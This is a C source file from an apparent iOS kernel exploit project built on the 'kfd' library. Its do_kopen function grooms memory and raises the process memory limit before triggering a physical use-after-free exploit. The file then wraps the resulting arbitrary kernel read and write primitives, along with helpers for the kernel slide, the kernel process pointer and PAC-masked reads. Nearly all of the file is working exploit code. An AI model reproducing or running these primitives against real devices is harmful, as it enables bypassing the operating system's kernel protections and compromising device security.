//
//  krw.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/29.
//


#include "krw.h"
#include "libkfd.h"
//#include "helpers.h"
#include <os/proc.h>
#include <inttypes.h>
#include "memoryControl.h"
//#include "memoryControl.h"

uint64_t _kfd = 0;
void NSLog(CFStringRef, ...);

__attribute__ ((optnone)) uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method, size_t headroom, bool use_headroom)
{
    if (use_headroom) {
        size_t STATIC_HEADROOM = (headroom * (size_t)1024 * (size_t)1024);
        uint64_t* memory_hog = NULL;
        size_t pagesize = sysconf(_SC_PAGESIZE);
        size_t memory_avail = os_proc_available_memory();
        size_t hog_headroom = STATIC_HEADROOM + puaf_pages * pagesize;
        size_t memory_to_hog = memory_avail > hog_headroom ? memory_avail - hog_headroom: 0;
        int32_t old_memory_limit = 0;
        memorystatus_memlimit_properties2_t mmprops;
        NSLog(CFSTR("[memoryHogger] memory_avail = %zu"), memory_avail);
        printf("[memoryHogger] memory_avail = %zu\n", memory_avail);
        NSLog(CFSTR("[memoryHogger] hog_headroom = %zu"), hog_headroom);
        printf("[memoryHogger] hog_headroom = %zu\n", hog_headroom);
        NSLog(CFSTR("[memoryHogger] memory_to_hog = %zu"), memory_to_hog);
        printf("[memoryHogger] memory_to_hog = %zu\n", memory_to_hog);
        if (hasEntitlement(CFSTR("com.apple.private.memorystatus"))) {
            uint32_t new_memory_limit = (uint32_t)(getPhysicalMemorySize() / UINT64_C(1048576)) * 2;
            int ret = memorystatus_control(MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES, getpid(), 0, &mmprops, sizeof(mmprops));
            if (ret == 0) {
                NSLog(CFSTR("[memoryHogger] current memory limit: %zu MiB"), mmprops.v1.memlimit_active);
                printf("[memoryHogger] current memory limit: %d MiB\n", mmprops.v1.memlimit_active);
                old_memory_limit = mmprops.v1.memlimit_active;
                ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), new_memory_limit, NULL, 0);
                if (ret == 0) {
                    NSLog(CFSTR("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully"), getpid(), new_memory_limit);
                    printf("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully\n", getpid(), new_memory_limit);
                } else {
                    NSLog(CFSTR("[memoryHogger] Failed to set memory limit: %d (%s)"), errno, strerror(errno));
                    printf("[memoryHogger] Failed to set memory limit: %d (%s)\n", errno, strerror(errno));
                }
            } else {
                NSLog(CFSTR("[memoryHogger] could not get current memory limits"));
                printf("[memoryHogger] could not get current memory limits\n");
            }
        }
        if (memory_avail > hog_headroom) {
            memory_hog = malloc(memory_to_hog);
            if (memory_hog != NULL) {
                for (uint64_t i = 0; i < memory_to_hog / sizeof(uint64_t); i++) {
                    memory_hog[i] = 0x4141414141414141;
                }
            }
            NSLog(CFSTR("[memoryHogger] Filled up hogged memory with A's"));
            printf("[memoryHogger] Filled up hogged memory with A's\n");
        } else {
            NSLog(CFSTR("[memoryHogger] Did not hog memory because there is too little free memory"));
            printf("[memoryHogger] Did not hog memory because there is too little free memory\n");
        }
        printf("[*] Performing kopen");
        _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
        
        if (memory_hog) free(memory_hog);
        if (old_memory_limit) {
            // set the limit back because it affects os_proc_available_memory
            int ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), old_memory_limit, NULL, 0);
            if (ret == 0) {
                NSLog(CFSTR("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully"), getpid(), old_memory_limit);
                printf("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully\n", getpid(), old_memory_limit);
            } else {
                NSLog(CFSTR("[memoryHogger] Failed to set memory limit: %d (%s)"), errno, strerror(errno));
                printf("[memoryHogger] Failed to set memory limit: %d (%s)\n", errno, strerror(errno));
            }
        }
    } else {
        _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    }

    return _kfd;
}

void do_kclose(void)
{
    printf("[*] Performing kclose");
    kclose((struct kfd*)(_kfd));
}

void do_kread(u64 kaddr, void* uaddr, u64 size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, u64 kaddr, u64 size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint64_t get_kslide(void) {
    return ((struct kfd*)_kfd)->perf.kernel_slide;
}

uint64_t get_kernproc(void) {
    return ((struct kfd*)_kfd)->info.kaddr.kernel_proc;
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

//Thanks @jmpews
uint64_t kread64_smr(uint64_t where) {
    uint64_t value = kread64(where) | base_pac_mask;
    if((value & 0x400000000000) != 0)
        value &= 0xFFFFFFFFFFFFFFE0;
    return value;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite16(uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}

void kwrite32(uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
void kwrite64(uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(_kfd), &_buf, where, sizeof(u64));
}
